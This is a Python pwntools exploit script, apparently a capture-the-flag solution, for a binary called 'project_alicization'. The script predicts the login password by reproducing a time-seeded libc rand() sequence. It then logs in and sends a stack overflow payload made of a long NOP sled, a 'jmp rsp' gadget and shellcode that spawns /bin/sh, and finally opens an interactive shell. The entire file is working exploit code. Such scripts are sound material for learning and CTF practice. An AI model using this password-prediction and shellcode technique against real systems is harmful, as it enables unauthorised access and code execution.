
from pwn import *
from ctypes import *
elf=context.binary=ELF('pwn/project_alicization/project_alicization')
_lib='/lib/x86_64-linux-gnu/libc.so.6'
lib=cdll.LoadLibrary(_lib)
r=process('pwn/project_alicization/project_alicization')
output=r.recvuntil(b':')

def make_psw(plus):
    lib.srand(time_base+plus)
    s=""
    for i in range(20):
        _random_val=lib.rand()
        s+=chr(_random_val +_random_val // 0x5d * -0x5d +0x21)#'!'=0x21
    return s

time_base=lib.time(0)
passwd_list=[]
passwd_list.append(make_psw(0).encode())	#same as remote
#passwd_list.append(make_psw(1).encode())	#remote is 1 second later
#
r.sendline(b'System Call login')
output=r.recvuntil(b'Username: ')
print(output)
r.sendline(b'Quinella')
output=r.recvuntil(b'Password: ')
print(output)
r.sendline(passwd_list[0])
output=r.recvuntil(b': ')
print(output)
#pause()
#[0x20,0x7e]

jmp_rsp = asm('jmp rsp')
jmp_rsp = next(elf.search(jmp_rsp))
#asm(shellcraft.pushstr("/bin/sh"))
shellcode = asm(shellcraft.sh())
padding=0x789d 
r.sendline(b'System Call generate shellcode element')
payload=flat([
    asm('nop') * padding,
    jmp_rsp,
    asm('nop') * 16,
    shellcode
])
r.sendline(payload)
output=r.recvuntil(b': ')
print(output)
r.interactive()
